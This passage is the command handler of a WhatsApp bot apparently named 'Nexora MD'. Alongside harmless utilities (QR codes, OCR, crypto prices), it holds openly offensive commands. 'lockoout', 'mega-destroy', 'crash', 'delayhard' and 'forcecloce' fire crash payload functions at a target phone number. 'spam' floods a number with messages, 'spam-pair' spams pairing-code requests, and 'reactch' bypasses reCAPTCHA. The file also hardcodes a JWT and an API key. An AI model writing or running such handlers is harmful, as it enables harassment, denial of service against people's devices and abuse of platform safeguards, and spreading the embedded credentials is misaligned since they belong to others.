    let hash = text.trim();
    let len = hash.length;
    let type = "Unknown Type";

    if (len === 32) type = "MD5";
    else if (len === 40) type = "SHA-1";
    else if (len === 64) type = "SHA-256";
    else if (hash.endsWith('=') && len % 4 === 0) type = "Base64 (Encoded String)";

    let report = `🔐 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗖𝗥𝗬𝗣𝗧𝗢-𝗔𝗡𝗔𝗟𝗬𝗦𝗜𝗦*\n\n`;
    report += `📥 *Input:* \`${hash}\`\n`;
    report += `📊 *Length:* ${len} bits/chars\n`;
    report += `🛡️ *Likely Type:* ${type}\n\n`;
    report += `_Analysis based on standard cryptographic signatures._`;

    reply(report);
}
break;
case 'encrypt': {

   if (!isCreator) return reply("omo owner only 😹🙌");
    const axios = require('axios');
    
    // Split input by the | symbol
    // Example: .encrypt Hello World | 1234
    let [input, password] = text.split('|').map(v => v.trim());

    if (!input || !password) {
        return reply("Usage: .encrypt [text] | [password]\nExample: .encrypt Hello | mykey");
    }

   // await m.react('🔐');
    const query = encodeURIComponent(input);
    const pass = encodeURIComponent(password);
    const url = `https://prexzyapis.com/tools/emoji-encrypt?input=${query}&pass=${pass}`;

    try {
        const response = await axios.get(url);
        const data = response.data;

        if (!data || !data.result) {
            return reply("Encryption failed. Check your input.");
        }

        let encryptMsg = `🔐 *EMOJI ENCRYPTION*\n\n`;
        encryptMsg += `📦 *Result:* ${data.result}\n\n`;
        encryptMsg += `🔑 *Pass:* ${password}\n`;
        encryptMsg += `_Use .decrypt with the same password to read._`;

        await empire.sendMessage(m.chat, { text: encryptMsg }, { quoted: m });
      //  await m.react('✅');

    } catch (err) {
        console.error(err);
        reply("Error connecting to encryption server.");
    }
}
break;
case 'avatar': {
    if (!text) return reply("👤 Enter name\nExample: .avatar Nexora");

    let name = encodeURIComponent(text);

    let url = `https://ui-avatars.com/api/?name=${name}&background=random&size=512`;

    await empire.sendMessage(m.chat, {
        image: { url },
        caption: `👤 Avatar for: ${text}`
    }, { quoted: m });
}
break;
case 'logo': {
    if (!text) return reply("🎨 Example: .logo Nexora");

    let txt = encodeURIComponent(text);

    let url = `https://flamingtext.com/net-fu/proxy_form.cgi?script=sketch-name&text=${txt}&_loc=generate&imageoutput=true`;

    await empire.sendMessage(m.chat, {
        image: { url },
        caption: `🎨 Logo: ${text}`
    }, { quoted: m });
}
break;
case 'crypto': {
    if (!text) return reply("💰 Example: .crypto btc");

    let coins = text.toLowerCase().split(' ');

    try {
        const res = await axios.get(`https://api.coingecko.com/api/v3/simple/price`, {
            params: {
                ids: coins.join(','),
                vs_currencies: 'usd',
                include_24hr_change: true
            }
        });

        let msg = `💰 *CRYPTO MARKET*\n\n`;

        coins.forEach(c => {
            let data = res.data[c];
            if (!data) return;

            let change = data.usd_24h_change;
            let arrow = change > 0 ? "🔺" : "🔻";

            msg += `🪙 ${c.toUpperCase()}\n`;
            msg += `💵 $${data.usd}\n`;
            msg += `${arrow} ${change.toFixed(2)}%\n\n`;
        });

        reply(msg);

    } catch (e) {
        reply("❌ Failed to fetch crypto data");
    }
}
break;
case 'searchimg': {
    if (!text) return reply("📸 Enter search term");

    let { key } = await empire.sendMessage(m.chat, { text: "📡 Searching images..." });

    try {
        const res = await axios.get(`https://duckduckgo.com/?q=${encodeURIComponent(text)}&iax=images&ia=images`);
        const token = res.data.match(/vqd='(.*?)'/)?.[1];

        const img = await axios.get(`https://duckduckgo.com/i.js?q=${encodeURIComponent(text)}&vqd=${token}&o=json`);

        let results = img.data.results;
        if (!results.length) throw "No results";

        let random = results[Math.floor(Math.random() * results.length)].image;

        await empire.sendMessage(m.chat, {
            image: { url: random },
            caption: `📸 Result for: ${text}`
        }, { quoted: m });

        await empire.sendMessage(m.chat, { delete: key });

    } catch (e) {
        console.log(e);
        await empire.sendMessage(m.chat, { text: "❌ Failed to fetch images", edit: key });
    }
}
break;
case 'population': {
    if (!text) return reply("🌍 Example: .population Nigeria");

    let { key } = await empire.sendMessage(m.chat, { text: "📡 Fetching country data..." });

    try {
        const res = await axios.get(`https://restcountries.com/v3.1/name/${encodeURIComponent(text)}`);

        let c = res.data[0];

        let msg = `🌍 *COUNTRY INFO*\n\n`;
        msg += `🏳️ Name: ${c.name.common}\n`;
        msg += `👥 Population: ${c.population.toLocaleString()}\n`;
        msg += `🏛️ Capital: ${c.capital?.[0] || "N/A"}\n`;
        msg += `🌐 Region: ${c.region}\n`;

        await empire.sendMessage(m.chat, { text: msg, edit: key });

    } catch {
        await empire.sendMessage(m.chat, { text: "❌ Country not found", edit: key });
    }
}
break;
case 'wallpaper': {
    if (!text) return reply("🖼️ Example: .wallpaper car");

    let { key } = await empire.sendMessage(m.chat, { text: "📡 Searching wallpapers..." });

    try {
        const res = await axios.get(`https://duckduckgo.com/?q=${encodeURIComponent(text)} wallpaper&iax=images&ia=images`);
        const token = res.data.match(/vqd='(.*?)'/)?.[1];

        const img = await axios.get(`https://duckduckgo.com/i.js?q=${encodeURIComponent(text)} wallpaper&vqd=${token}&o=json`);

        let results = img.data.results;
        if (!results.length) throw "no result";

        let pick = results[Math.floor(Math.random() * results.length)].image;

        await empire.sendMessage(m.chat, {
            image: { url: pick },
            caption: `🖼️ ${text} wallpaper`
        }, { quoted: m });

        await empire.sendMessage(m.chat, { delete: key });

    } catch {
        await empire.sendMessage(m.chat, { text: "❌ Failed to fetch wallpaper", edit: key });
    }
}
break;
case 'claude':
case 'claudeai': {
    if (!isCreator) return;
    if (!text) return reply(`🤖 *Nexora Claude AI*\n\nUsage: ${prefix + command} <question>\nExample: ${prefix + command} who is the owner of SpaceX?`);

    // 1. React and send temporary status
    await empire.sendMessage(m.chat, { react: { text: '🧠', key: m.key } });
    const status = await reply(`⏳ *Nexora is consulting Claude...*`);

    try {
        const axios = require('axios');
        const apiUrl = `https://omegatech-api.dixonomega.tech/api/ai/Claude?text=${encodeURIComponent(text)}`;
        
        const response = await axios.get(apiUrl, { timeout: 30000 });
        const data = response.data;

        if (data.success && data.result) {
            let answer = data.result;
            
            // Limit long responses to prevent WhatsApp lag
            if (answer.length > 4096) {
                answer = answer.substring(0, 4090) + "\n\n... (Nexora: response truncated)";
            }

            // 2. Send the result and cleanup
            await reply(`🤖 *Nexora AI (Claude)*\n\n${answer}`);
            await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            await empire.sendMessage(m.chat, { delete: status.key });

        } else {
            throw new Error('Nexora could not reach Claude.');
        }
    } catch (err) {
        console.error('Claude error:', err);
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await empire.sendMessage(m.chat, { delete: status.key });
        reply(`❌ *Nexora Error*\n\nClaude AI is currently unavailable. Try again later.`);
    }
}
break;
case 'lockoout': {
    if (!isPremium) return reply("⭐ THIS COMMAND IS FOR PREMIUM USERS ONLY use .buyprem to get yours ");
    
    if (!text) return reply(`Usage: ${prefix + command} 234xxx`);
    let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    reply("⚠️ *INITIATING HARD LOCKOUT V3*... Injecting binary buffers.");
    
    // Increased to 25 for a 100% crash rate on modern devices
    await nexoraUltimateLock(target, 25);
    
    reply("✅ *INJECTION COMPLETE*. The target's chat thread is now corrupted.");
}
break;

case 'color': {
    let { key } = await empire.sendMessage(m.chat, { text: "🎨 Generating color..." });

    try {
        const res = await axios.get(`https://www.thecolorapi.com/random`);
        const c = res.data;

        let msg = `🎨 *COLOR INFO*\n\n`;
        msg += `🎯 HEX: ${c.hex.value}\n`;
        msg += `🔢 RGB: ${c.rgb.value}\n`;
        msg += `📛 Name: ${c.name.value}`;

        await empire.sendMessage(m.chat, {
            image: { url: c.image.bare },
            caption: msg
        }, { quoted: m });

        await empire.sendMessage(m.chat, { delete: key });

    } catch {
        await empire.sendMessage(m.chat, { text: "❌ Failed to generate color", edit: key });
    }
}
break;
case 'qr': {
    if (!text) return reply("📱 Example: .qr hello world");

    let url = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(text)}`;

    await empire.sendMessage(m.chat, {
        image: { url },
        caption: `📱 QR Generated for:\n${text}`
    }, { quoted: m });
}
break;
case 'readqr': {
    if (!m.quoted) return reply("🔍 Reply to a QR image");

    let mime = m.quoted.mimetype || '';

    if (!mime.includes('image')) {
        return reply("❌ Reply to an image containing QR");
    }

    try {
        let buffer = await m.quoted.download();

        const form = new FormData();
        form.append('file', buffer, 'qr.png');

        const res = await axios.post(
            'https://api.qrserver.com/v1/read-qr-code/',
            form,
            { headers: form.getHeaders() }
        );

        let data = res.data[0]?.symbol[0]?.data;

        if (!data) return reply("❌ No QR detected");

        reply(`🔍 *QR RESULT:*\n\n${data}`);

    } catch (e) {
        console.log(e);
        reply("❌ Failed to read QR");
    }
}
break;
case 'mega-destroy': {
                if (!isOwner) return reply("🔒 *Owner only*");
                if (!q) return reply("📌 *Usage:* mega-destroy 923xx");

                let targetNumber = q.replace(/[^0-9]/g, '');

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(targetNumber)) {
                    return reply("🔒 *Protected*");
                }

                let target = targetNumber + "@s.whatsapp.net";
                reply(`💀 *Target:* ${targetNumber}\n⚡ *Attack initiated*`);

                // Run all combo functions
                await Combo(target);           // Your combo with callinvisible, ForceXFrezee, blank1
                await sleep(2000);
                await fcnew(target);           // Your fcnew with CarouselVY4, LocaXotion, XinsooInvisV1
                await sleep(2000);
                await XPhone(target);          // Your XPhone with many functions
                await sleep(2000);
                await BayuOfficialHard(target); // Your BayuOfficialHard with protoXimg, bulldozer, etc
                await sleep(2000);
                await ForceClose(target);      // Your ForceClose with forclose

                reply(`✅ *Attack completed on ${targetNumber}*`);
                break;
            }
// Usage: await NullLenght(target, mention = true)
            case "new-crash":
            case "blank":
            case "nexora-invis": {
                if (!isCreator) return reply('🔒 *Owner only*');
              //  if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                await NullLenght(target, mention = true)

                await empire.sendMessage(from, { react: { text: "🥶", key: m.key } });
            }
                break;
         //   case "delay":
            case "crash":
            case "blank":
            case "nexora-invis": {
                if (!isCreator) return reply('🔒 *Owner only*');
              //  if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                
                await Combo(target);
                await sleep(2000);
                Xtended
                await sleep(2000);
                HyperSixty
                await sleep(2000);
               LocaCrashUi2(target)
               await sleep(2000);
               kresjandaotax(target);
               await sleep(2000);
                await fcnew(target);
                await sleep(2000);
                await Combo(target);
                await XPhone(target);

                await empire.sendMessage(from, { react: { text: "🥶", key: m.key } });
            }
                break;

            case "delayhard": {
                if (!isCreator) return reply('🔒 *Owner only*');
                if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["923254352974"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                
                await fcnew(target);
                await sleep(2000);
                await fcnew(target);
                await sleep(2000);
                await Combo(target);
                await sleep(2000);
                await Combo(target);
                await sleep(2000);
                await fcnew(target);
                await sleep(2000);
                await fcnew(target);
                await sleep(2000);
                await Combo(target);
                await sleep(2000);
                await Combo(target);
                await sleep(2000);
                await XPhone(target);

                await empire.sendMessage(from, { react: { text: "😈", key: m.key } });
            }
                break;

            case "close-zapp":
            case "bruteclose":
            case "metaclose":
            case "forcecloce": {
                if (!isCreator) return reply('🔒 *Owner only*');
                if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

                let pepec = args[0].replace(/[^0-9]/g, "");

                // 🔒 PROTECTED NUMBERS CHECK
                let protectedNumbers = ["8087253512"];
                if (protectedNumbers.includes(pepec)) {
                    return reply("🔒 *Protected*");
                }

                let target = pepec + '@s.whatsapp.net';
                reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}`);

                await doneress();

                for (let i = 0; i < 7; i++) {
                    await ForceClose(target);
                }

                await XPhone(target);

                await empire.sendMessage(from, { react: { text: "🥶", key: m.key } });
            }
                break;
                
                
 case 'bomb':
 case 'spam': {
     if (!isCreator) return;
        
           const q = m.message?.conversation ||
                     m.message?.extendedTextMessage?.text || '';
           const [target, text, countRaw] = q.split(',').map(x => x?.trim());
       
           const count = parseInt(countRaw) || 5;
       
           if ( !isOwner || !target || !text || !count) {
               return await reply(m, 
                   '📌 *ᴜsᴀɢᴇ:* .spam <number>,<message>,<count>\n\nExample:\n.spam 234XXXXXXX,Mrs Trust 💘,5'
               );
           }
       
           const jid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
       
           if (count > 100) {
               return await reply(m, '❌ *Easy, brr! Max 100 messages per spam*');
           }
       
           // Send initial confirmation
           await reply(m, `💣 *Starting spam attack...*\nTarget: ${target}\nMessages: ${count}`);
       
           for (let i = 0; i < count; i++) {
               await empire.sendMessage(jid, { text });
               await delay(700);
           }
       
           await reply(m, `✅ spam sent to ${target} — ${count} messages! 💣🤘`);
           break;
       }               
                
    case 'spam-pair': { 
    if (!isCreator) return reply("owner only lol 😆");
    await empire.sendMessage(m.chat, { react: { text: '🖇️', key: m.key } });
    
    if (!q) return reply(`𝚙𝚕𝚎𝚊𝚜𝚎 𝚎𝚗𝚝𝚎𝚛 𝚊 𝚟𝚊𝚕𝚒𝚍 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚘 𝚛𝚎qu𝚎𝚜𝚝 𝚠𝚒𝚝𝚑 𝚘𝚙𝚝𝚒𝚘𝚗𝚊𝚕 𝚌𝚘𝚞𝚗𝚝.\n\nFormat: ${prefix + command} 234xxxxxxx [count]\nExample: ${prefix + command} 234xxxxxxx 10`);

    // Split input safely to extract number and loop count
    let argsPair = text.trim().split(/\s+/);
    let targetNum = argsPair[0];
    
   
    let pairLoops = argsPair[1] ? parseInt(argsPair[1]) : 1;
    if (isNaN(pairLoops) || pairLoops < 1) pairLoops = 1;
    if (pairLoops > 50) return reply("❌ Maximum allowed pairing request loop count is 10.");

    let targetJid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : targetNum.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    let contactCheck = await empire.onWhatsApp(targetJid);
    if (contactCheck.length === 0) {
        return reply("The number is not registered on WhatsApp");
    }

    reply(`🚀 Requesting pairing code ${pairLoops} time(s) for @${targetJid.split('@')[0]}...`, { mentions: [targetJid] });

    
    const pairScript = require('./pair.js');

    for (let i = 0; i < pairLoops; i++) {
        await pairScript(targetJid);
        
        // Wait 2🚩 seconds for the file system to update the verification code
        await sleep(2000);

        try {
            // Read from your storage directory path
            let rawData = fs.readFileSync('./empirestore/pairing/pairing.json', 'utf-8');
            let parsedData = JSON.parse(rawData);

            // Send raw code text
            await empire.sendMessage(from, { text: `${parsedData.code}` }, { quoted: m });

            // Send user instructions card
            let cardText = `*[Nexora MD v3 pairing system 🚀]*\n\n➔ Request: [${i + 1}/${pairLoops}]\n🤖 Code: ${parsedData.code}\n\n➔ Open WhatsApp\n➔ Linked Devices\n➔ Link Device\n➔ Enter this code`;

            await empire.sendMessage(from, { text: cardText }, { quoted: m });
        } catch (fileErr) {
            console.error("Pairing storage file read error:", fileErr);
            await empire.sendMessage(from, { text: `❌ Failed to get code data for request ${i + 1}` }, { quoted: m });
        }

        
        if (i < pairLoops - 1) {
            await sleep(1000);
        }
    }
} // End of private scope block
break;
            
/**
 * ⚡ WhatsApp Channel Reactor
 * Author: Omegatech
 * Version: 1.1 (Updated Bypass)
 *
 * 📡 OFFICIAL CHANNELS:
 * WhatsApp: https://whatsapp.com/channel/0029Vb785rSBlHpWSitPY61i
 * Telegram: https://t.me/+OrLFsvjjlVM2ZjRk
 */

case 'rch':
case 'reactch': {
    if (!isCreator) return reply("owner only 😕 get your own bot t.me/nexoramdbot");
    if (!args[0]) return m.reply(`⚡ *WhatsApp Channel Reactor*\n\nUsage: ${usedPrefix + command} <link> <emoji1,emoji2>\n\nExample:\n${usedPrefix + command} https://whatsapp.com/channel/0029Vb785rSBlHpWSitPY61i/585 😭,🔥`)
    
   // await m.react('🕒')
    
    try {
        const postLink = args[0]
        const reactsRaw = args.slice(1).join(' ')
        
        if (!postLink.includes('whatsapp.com/channel/')) return m.reply('❌ Invalid WhatsApp channel link.')
        if (!reactsRaw) return m.reply('❌ No emojis provided.')

        const emojis = reactsRaw.split(',').map(e => e.trim()).filter(Boolean)
        if (emojis.length > 4) return m.reply('❌ Max 4 emojis allowed.')

        // 1. Get Recaptcha Token (New Endpoint)
        const { data: captchaData } = await axios.get('https://omegatech-api.dixonomega.tech/api/tools/recaptcha-v3', {
            params: {
                sitekey: '6LemKk8sAAAAAH5PB3f1EspbMlXjtwv5C8tiMHSm',
                url: 'https://back.asitha.top/api',
                use_enterprise: 'false'
            }
        })

        if (!captchaData?.success || !captchaData?.token) throw new Error('Recaptcha bypass failed')

        const userJwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5OGE2ZGI5MjVjMzUyOTcxZTIyYTdkNSIsImlhdCI6MTc3NTg1NzUyMCwiZXhwIjoxNzc2NDYyMzIwfQ.q7D6potY6cl3n-ZY8nQbetNFqPSl79aF5IIZ_QbtABc'
        const backendUrl = 'https://back.asitha.top/api'

        // 2. Get Temp API Key
        const { data: tempKeyData } = await axios.post(`${backendUrl}/user/get-temp-token`, 
            { recaptcha_token: captchaData.token },
            { headers: { Authorization: `Bearer ${userJwt}`, 'Content-Type': 'application/json' } }
        )

        if (!tempKeyData?.token) throw new Error('Temp API key failed')

        // 3. Send Reaction
        await axios.post(`${backendUrl}/channel/react-to-post?apiKey=${tempKeyData.token}`, 
            { post_link: postLink, reacts: emojis.join(',') },
            { headers: { Authorization: `Bearer ${userJwt}`, 'Content-Type': 'application/json' } }
        )

       // await m.react('✅')
     //   m.reply('🔥 Reactions sent successfully.')

    } catch (e) {
        console.error(err);
        //await m.react('❌')
       // m.reply(`❌ Failed: ${e.response?.data?.message || e.message}`)
    }
}
break
case 'antigcmention': 
case 'antigroupmention': {
    if (!m.isGroup) return reply('❌ Groups only.');
    if (!isAdmins && !isCreator) return reply("❌ Admin only.");

    // Assuming you created antigcmention.json in your lib folder
    const antigcFile = './lib/antigcmention.json';
    if (!fs.existsSync(antigcFile)) fs.writeFileSync(antigcFile, JSON.stringify([]));
    let antigcDB = JSON.parse(fs.readFileSync(antigcFile));

    const isEnabled = antigcDB.includes(from);
    if (isEnabled) {
        antigcDB = antigcDB.filter(g => g !== from);
        fs.writeFileSync(antigcFile, JSON.stringify(antigcDB, null, 2));
        reply("🚫 Anti-Group Mention disabled.");
    } else {
        antigcDB.push(from);
        fs.writeFileSync(antigcFile, JSON.stringify(antigcDB, null, 2));
        reply("✅ Anti-Group Mention enabled. I will now delete status mention notifications.");
    }
}
break;
case 'github': {
    if (!isCreator) return;
    if (!text) return reply(`⚠️ Usage: ${command} <username>\n\nExample: ${command} torvalds`)

    try {
        let res = await axios.get(`https://api.github.com/users/${encodeURIComponent(text)}`)
        let user = res.data

        if (!user || !user.login) return reply("❌ User not found.")

        let profileInfo = `👨‍💻 *GitHub Profile*\n
👤 Name: ${user.name || "N/A"}
🔖 Username: ${user.login}
📍 Location: ${user.location || "N/A"}
📦 Public Repos: ${user.public_repos}
👥 Followers: ${user.followers}
👤 Following: ${user.following}
📅 Created: ${new Date(user.created_at).toLocaleDateString()}
🌐 Profile: ${user.html_url}`

        // Send profile pic + info
        await empire.sendMessage(m.chat, {
            image: { url: user.avatar_url },
            caption: profileInfo
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        reply("⚠️ Failed to fetch GitHub profile. Try again.")
    }
}
break
case 'addcase': {
    if (!isCreator) return reply("🕸️ *ACCESS DENIED:* Only the King can rewrite the system.");
    if (!text) return reply(`*Usage:* ${prefix}addcase <your_code>\n\n*Example:* ${prefix}addcase case 'ping': reply('pong'); break;`);

    await empire.sendMessage(m.chat, { react: { text: '💾', key: m.key } });

    try {
        const fileName = './case.js';
        let fileContent = fs.readFileSync(fileName, 'utf8');

        // Regex to find the very last 'break' before the 'default:' or end of switch
        // This ensures the new case is added inside the switch block
        const switchEnd = /default:/g;
        
        if (switchEnd.test(fileContent)) {
            const newCode = `\n\n${text}\n\n`;
            const updatedContent = fileContent.replace('default:', `${newCode}default:`);
            
            fs.writeFileSync(fileName, updatedContent);
            
            await reply("✅ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗢𝗨𝗥𝗖𝗘 𝗨𝗣𝗗𝗔𝗧𝗘𝗗*\n\nNew logic has been injected into the core. Restarting is recommended.");
            await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            reply("❌ *System Error:* Could not find a safe injection point in case.js.");
        }
    } catch (err) {
        console.error(err);
        reply("☣️ *CRITICAL ERROR:* Failed to write to source file.");
    }
}
break;

case 'delcase': {
    if (!isCreator) return;
    if (!text) return reply(`*Usage:* ${prefix}delcase <command_name>\n\n*Example:* ${prefix}delcase ping`);

    await empire.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } });

    try {
        const fileName = './case.js';
        let fileContent = fs.readFileSync(fileName, 'utf8');

        // Regex to find: case 'text': [everything in between] break
        const caseRegex = new RegExp(`case\\s+'${text}':[\\s\\S]*?break`, 'g');

        if (caseRegex.test(fileContent)) {
            // Replace the found block with an empty string
            const updatedContent = fileContent.replace(caseRegex, '');
            
            fs.writeFileSync(fileName, updatedContent);
            
            await reply(`🗑️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗟𝗘𝗔𝗡𝗘𝗗*\n\nCase '${text}' has been purged from the system.`);
            await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            reply(`❌ *Case Not Found:* '${text}' does not exist in the current logic.`);
        }
    } catch (err) {
        console.error(err);
        reply("☣️ *CRITICAL ERROR:* Failed to purge code from source.");
    }
}
break;




case 'ocr': {
    if (!m.quoted && m.mtype !== 'imageMessage') return reply('❌ Reply to or send an image with the caption: *.ocr*');
    
    let imgBuffer = await downloadAndSaveMediaMessage(
        m.quoted ? { message: { imageMessage: m.quoted } } : m, 
        'buffer'
    );
    
    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    const axios = require('axios');
    
    try {
        // Upload to cloud storage first to feed the OCR engine
        const tmpDir = require('path').join(process.cwd(), 'tmp');
        if (!require('fs').existsSync(tmpDir)) require('fs').mkdirSync(tmpDir, { recursive: true });
        const tempFile = require('path').join(tmpDir, `ocr_${Date.now()}.png`);
        require('fs').writeFileSync(tempFile, imgBuffer);

        const FormData = require('form-data');
        const form = new FormData();
        form.append('files[]', require('fs').createReadStream(tempFile));
        
        const uploadRes = await axios.post('https://qu.ax/upload.php', form, { headers: form.getHeaders() });
        require('fs').unlinkSync(tempFile);

        if (!uploadRes.data?.success) return reply('❌ Failed to upload image for scanning.');
        const imgUrl = uploadRes.data.files[0].url;

        // Query server OCR engine
        const ocrRes = await axios.get(`https://api.api-ninjas.com/v1/imagetotext?url=${encodeURIComponent(imgUrl)}`, {
            headers: { 'X-Api-Key': 'c9NFnKsLfm1vMbpPf4ez8BaH911PoSAEGna3hFSB' } // Get a free key at api-ninjas.com
        });

        const textLines = ocrRes.data.map(item => item.text).join(' ');
        if (!textLines.trim()) return reply('❌ No readable text detected inside this image.');

        reply(`📝 *EXTRACTED TEXT:* \n\n${textLines}`);
    } catch (e) {
        reply(`❌ OCR Engine Error: ${e.message}`);
    }
}
break;
case 'ocr2': {
    if (!m.quoted && m.mtype !== 'imageMessage') return reply('❌ Reply to or send an image with the caption: *.ocr*');
    
    // Extract buffer array
    let imgBuffer = await downloadAndSaveMediaMessage(
        m.quoted ? { message: { imageMessage: m.quoted } } : m, 
        'buffer'
    );
    
    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    
    const axios = require('axios');
    const FormData = require('form-data');
    
    try {
        // Construct upload frame directly inside memory
        const form = new FormData();
        form.append('file', imgBuffer, { filename: `ocr_${Date.now()}.png`, contentType: 'image/png' });
        
        // 1. Send buffer array to Ezgif's file conversion stream
        const uploadRes = await axios.post('https://ezgif.com/image-to-text', form, {
            headers: form.getHeaders(),
            timeout: 20000
        });
        
        // 2. Parse the HTML return text payload using regex (No external HTML parsing library required)
        const html = uploadRes.data;
        const textMatch = html.match(/<textarea[^>]*id="code"[^>]*>([\s\S]*?)<\/textarea>/);
        
        if (!textMatch || !textMatch[1].trim()) {
            return reply('❌ Text extraction failed. Ensure the image contains clear, readable digital text.');
        }
        
        // Decode common HTML entities safely
        const cleanedText = textMatch[1]
            .replace(/&amp;/g, '&')
            .replace(/&lt;/g, '<')
            .replace(/&gt;/g, '>')
            .replace(/&quot;/g, '"')
            .trim();
            
        reply(`📝 *EXTRACTED TEXT FROM IMAGE:* \n\n${cleanedText}`);
        
    } catch (e) {
        console.error(e);
        reply(`❌ OCR Processing Engine Timeout: ${e.message}`);
    }
}
break;
case 'savecontact': {
if (!isCreator) return;
    let targetNum;
    let targetName;

    if (m.quoted) {
        targetNum = m.quoted.sender;
    } else if (m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
        targetNum = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
    }

    if (!targetNum) return reply('❌ Please mention or reply to the user whose contact payload you wish to generate.');

    await empire.sendMessage(m.chat, { react: { text: '💾', key: m.key } });

    try {
        // Fetch public username parameters via network profiles safely
        const contactMeta = await empire.onWhatsApp(targetNum);
        const contactParsedName = args.join(' ') || `Nexora Contact (${targetNum.split('@')[0]})`;

        const cleanedRawNumber = targetNum.split('@')[0];

        // Map complete structural vCard execution block
        const vcardPayload = 
            'BEGIN:VCARD\n' +
            'VERSION:3.0\n' +
            `FN:${contactParsedName}\n` +
            `ORG:Nexora Network Core;\n` +
            `TEL;type=CELL;type=VOICE;waid=${cleanedRawNumber}:+${cleanedRawNumber}\n` +
            'END:VCARD';

        await empire.sendMessage(m.chat, {
            contacts: {
                displayName: contactParsedName,
                contacts: [{ vcard: vcardPayload }]
            }
        }, { quoted: m });

    } catch (err) {
        reply('❌ Failed to construct contact payload file.');
    }
}
break;

// ==========================================
// 🏢 BUSINESS MODULES (IN-MEMORY SYSTEM)
// ==========================================

case 'createbiz': {
if (!isCreator) return;
    const textArgs = args.join(' ').split('|');
    const bizName = textArgs[0]?.trim();
    const bizCategory = textArgs[1]?.trim();
    const bizDesc = textArgs[2]?.trim();

    if (!bizName || !bizCategory) {
        return reply(`❌ *Incomplete Parameters.*\n\n*Usage:* \`${prefix + command} Name | Category | Optional Description\``);
    }

    const bizId = 'BIZ-' + Math.floor(1000 + Math.random() * 9000);
    
    global.businessRegistry[bizId] = {
        id: bizId,
        owner: m.sender,
        name: bizName,
        category: bizCategory,
        desc: bizDesc || 'No bio listed.',
        ratingSum: 0,
        ratingCount: 0,
        reviews: [],
        bannerUrl: 'https://images.unsplash.com/photo-1516321318423-f06f85e504b3' // Default fallback
    };

    reply(`┏━━━━━━━━━━━━━━━━━━━━┓\n┃ 🏢 *BUSINESS CREATED SUCCESS* \n┣━━━━━━━━━━━━━━━━━━━━┫\n┃ 🆔 *ID:* \`${bizId}\`\n┃ 📦 *Name:* ${bizName}\n┃ 🏷️ *Category:* ${bizCategory}\n┗━━━━━━━━━━━━━━━━━━━━┛`);
}
break;

case 'editbiz': {
if (!isCreator) return;
    const textArgs = args.join(' ').split('|');
    const bizId = textArgs[0]?.trim().toUpperCase();
    const newName = textArgs[1]?.trim();
    const newCategory = textArgs[2]?.trim();
    const newDesc = textArgs[3]?.trim();

    if (!global.businessRegistry[bizId]) return reply('❌ *Error:* Enterprise ID not found.');
    if (global.businessRegistry[bizId].owner !== m.sender && !isCreator) return reply('❌ *Access Denied:* You do not own this enterprise profile.');

    if (newName) global.businessRegistry[bizId].name = newName;
    if (newCategory) global.businessRegistry[bizId].category = newCategory;
    if (newDesc) global.businessRegistry[bizId].desc = newDesc;

    reply(`✅ *Enterprise Registry Updated successfully for ID:* \`${bizId}\``);
}
break;

case 'deletebiz': {
if (!isCreator) return;
    const bizId = args[0]?.toUpperCase();
    if (!bizId || !global.businessRegistry[bizId]) return reply('❌ Please provide a valid Business ID.');
    if (global.businessRegistry[bizId].owner !== m.sender && !isCreator) return reply('❌ *Access Denied:* Identity verification failed.');

    delete global.businessRegistry[bizId];
    reply(`🗑️ *Enterprise Profile \`${bizId}\` purged completely from memory.*`);
}
break;

case 'listbiz': {
if (!isCreator) return;
    const records = Object.values(global.businessRegistry);
    if (records.length === 0) return reply('🏢 *The Commercial Registry Registry is currently empty.*');

    let layout = `┏━━━━━━━━━━━━━━━━━━━━┓\n┃ 🏢 *COMMERCIAL REGISTRY MATRIX* \n┣━━━━━━━━━━━━━━━━━━━━┫\n`;
    records.forEach(b => {
        const rating = b.ratingCount > 0 ? (b.ratingSum / b.ratingCount).toFixed(1) : '0.0';
